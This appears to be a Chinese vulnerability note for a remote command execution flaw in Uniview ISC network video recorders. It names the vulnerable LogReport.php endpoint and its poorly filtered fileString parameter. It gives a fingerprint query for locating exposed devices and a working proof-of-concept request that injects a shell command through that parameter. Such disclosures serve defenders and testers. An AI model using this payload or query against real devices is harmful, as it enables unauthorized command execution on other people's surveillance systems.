# 浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞

## 漏洞描述

浙江宇视科技 网络视频录像机 ISC /Interface/LogReport/LogReport.php 页面，fileString 参数过滤不严格，导致攻击者可执行任意命令

## 漏洞影响

<a-checkbox checked>浙江宇视科技 网络视频录像机 ISC</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="uniview-ISC"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1645887597864-478bdd00-527b-4a78-a161-f7bbf022a0d5.png)

验证POC

```javascript
/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>1.txt
```

![img](../../../.vuepress/public/img/1645887664378-917e4c3f-62cc-4dd2-9faa-eb8aeadd734d.png)



